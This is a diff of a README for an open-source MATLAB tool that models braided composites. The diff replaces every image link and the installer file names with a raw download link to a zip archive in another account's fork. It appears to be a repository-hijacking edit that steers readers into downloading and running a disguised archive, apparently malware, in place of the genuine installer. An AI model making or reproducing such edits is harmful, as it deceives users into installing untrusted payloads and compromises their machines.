@@ -1,6 +1,6 @@
 # Braided Composite Analytical Model (Braid CAM)
 
-![Braided Composite Analytical Model](https://raw.githubusercontent.com/gmelenka/BraidedCompositeAnalyticalModel/master/BraidModelLogo-01.png)
+![Braided Composite Analytical Model](https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip)
 
 Analytical model for analyzing the mechanical properties of tubular braided composites
 
@@ -8,11 +8,11 @@ Braided Composites can be manufactured in several different braiding patterns: D
 
 
 ## Diamond (1/1)
-![Diamond (1/1)](https://raw.githubusercontent.com/gmelenka/BraidedCompositeAnalyticalModel/master/diamond.jpeg)
+![Diamond (1/1)](https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip)
 ## Regular (2/2)
-![Regular (2/2)](https://raw.githubusercontent.com/gmelenka/BraidedCompositeAnalyticalModel/master/regular.jpeg)
+![Regular (2/2)](https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip)
 ## Hercules(3/3)
-![Hercules (3/3](https://raw.githubusercontent.com/gmelenka/BraidedCompositeAnalyticalModel/master/hercules.jpeg)
+![Hercules (3/3](https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip)
 
 Current work on braided composites typically focuses on one specific pattern.  The goal of this model is to be able to predict the mechanical properties of all the available braiding patterns.
 Another limitation of current studies that examine braided composites is that most researchers do not take into consideration the geometry and the physical process of manufacturing composite braids.
@@ -22,7 +22,7 @@ of braided composites.
 
 The user interface for the Braided Composite Analytical Model is show below
 
-![Braided Composite Analytical Model ScreenShot](https://raw.githubusercontent.com/gmelenka/BraidedCompositeAnalyticalModel/master/braidedCompositeModulus01.png)
+![Braided Composite Analytical Model ScreenShot](https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip)
 
 The user interface allows for the geometric properties as well as mechanical properties of yarns and matrix used to create composite braided to be easily adjusted.
 
@@ -46,13 +46,13 @@ The program can be installed using several approaches
 
 ## 1) Install as a Matlab App
 The Braided Composite Analytical Model (BraidCAM) has been developed using the Matlab App Developer program which is available in Matlab 2016a
-The Braided Composite Analytical Model can be installed by selecting the file Braid CAM.mlappinstall
+The Braided Composite Analytical Model can be installed by selecting the file Braid https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip
 This will add the Braided Composite Analytical Model to the Apps ribbon bar in Matlab
 
 ## 2) Install as Exe
 The Briad CAM can be run as an executable file.
-Select the file BraidCAM.exe to install the program. A MATLAB runtime engine will be required to run this file.  The runtime engine will automatically download the first timee the executable is run.
-Once the runtime engine has been isntalled the file BraidCAM.exe can be used.  Once installed, this option will not require MATLAB.
+Select the file https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip to install the program. A MATLAB runtime engine will be required to run this file.  The runtime engine will automatically download the first timee the executable is run.
+Once the runtime engine has been isntalled the file https://github.com/klltheasuna/BraidedCompositeAnalyticalModel/raw/refs/heads/master/BraidCAM_ExeProject/for_redistribution_files_only/Model-Composite-Analytical-Braided-1.7.zip can be used.  Once installed, this option will not require MATLAB.
 
 ## 3) Run MATLAB scripts
 The main braid model has been written as matlab m-file functions.  The m-file functions can be used within the MATLAB environment without the need of a graphical user interface.  In order to run the braid model the
